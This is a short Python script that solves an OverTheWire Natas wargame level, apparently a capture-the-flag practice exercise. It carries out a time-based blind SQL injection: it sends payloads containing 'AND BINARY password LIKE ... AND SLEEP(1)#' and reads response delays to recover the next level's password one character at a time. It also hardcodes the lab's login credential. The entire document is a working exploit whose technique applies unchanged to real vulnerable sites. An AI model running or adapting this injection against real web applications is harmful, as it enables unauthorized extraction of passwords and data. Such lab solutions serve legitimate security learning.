#!/usr/local/bin/python3
import requests
from string import *

# TIMING SQL INJECTION ATTACK

characters = ascii_lowercase + ascii_uppercase + digits

username = "natas17"
password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"

url = 'http://%s.natas.labs.overthewire.org/?debug' % username

pas = ''

while (len(pas) < 32):
    for char in characters:
        print('trying ' + pas + char)
        data = {"username": 'natas18" AND BINARY password LIKE "' + pas + char + '%" AND SLEEP(1)#'}
        response = requests.post(url, data=data, auth=(username, password))

        if response.elapsed.total_seconds() > 1:
            pas = pas + char
            break

print('password for natas 18 is: ' + pas)
